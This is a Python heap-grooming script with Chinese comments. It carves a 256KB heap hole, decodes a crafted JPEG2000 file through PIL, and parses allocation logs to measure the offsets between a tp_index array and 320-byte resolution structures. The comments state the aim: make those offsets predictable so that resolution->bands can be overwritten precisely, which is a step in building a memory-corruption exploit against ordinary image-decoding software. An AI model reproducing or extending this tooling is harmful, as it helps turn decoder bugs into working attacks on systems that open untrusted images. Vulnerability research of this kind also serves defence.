#!/usr/bin/env python3
# 构造实验：预留一个大空洞 -> 解码 -> 检查 tp_index 与各 resolution 数组(320B) 的【地址间距】
#   目标：间距可预测 => 之后就能精确写出某个 resolution->bands(+0x20)
import ctypes, gc, glob, os, re, struct, subprocess, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else '/tmp/GR23.j2k'
HOLE = int(sys.argv[2]) if len(sys.argv) > 2 else 262144      # 256KB 空洞
LOG = '/tmp/groom320.log'

# --- 在【子进程】里做（解码可能 abort）---
pid = os.fork()
if pid == 0:
    fd = os.open(LOG, os.O_WRONLY | os.O_CREAT | os.O_TRUNC)
    os.dup2(fd, 2)
    out = []
    # 1) 制造大空洞：连续分配再整体释放
    blk = [bytes(HOLE // 4096) for _ in range(4096)]   # 4KB×64 = 256KB
    lo = min(id(b) for b in blk)
    hi = max(id(b) for b in blk)
    del blk
    gc.collect()
    out.append("HOLE_RANGE %#x %#x (%dKB)" % (lo, hi, HOLE // 1024))
    # 2) 解码
    from PIL import Image
    try:
        im = Image.open(TARGET)
        im.load()
        out.append("DECODE_OK")
    except BaseException as e:
        out.append("DECODE_ERR %r" % (e,))
    os.write(1, ("\n".join(out) + "\n").encode())
    os._exit(0)

os.waitpid(pid, 0)
log = open(LOG, errors='ignore').read()

# --- 解析：数组 与 320 分配 的地址 ---
arr = None
tp = []
for ln in log.splitlines():
    m = re.search(r'calloc\] n=23 s=24 -> (0x[0-9a-f]+)', ln)
    if m:
        arr = int(m.group(1), 16)
    m = re.search(r'size=320 -> (0x[0-9a-f]+)', ln)
    if m:
        tp.append(int(m.group(1), 16))
m32 = [ln for ln in log.splitlines() if 'size=320' in ln]

print("数组地址 =", hex(arr) if arr else None)
print("320 分配数 =", len(tp))
if arr and tp:
    print("\n=== 相对数组的偏移（排序后）===")
    for a in sorted(tp):
        d = a - arr
        print("   %#x  delta=%+#x  (mod 24 = %d, mod 336 = %d)" % (a, d, d % 24, d % 336))
print("\n=== 数组前后各 5 条分配（时间序）===")
lines = log.splitlines()
idx = None
for i, ln in enumerate(lines):
    if 'n=23 s=24' in ln:
        idx = i
        break
if idx is not None:
    for ln in lines[max(0, idx - 5):idx + 12]:
        print("  ", ln[:96])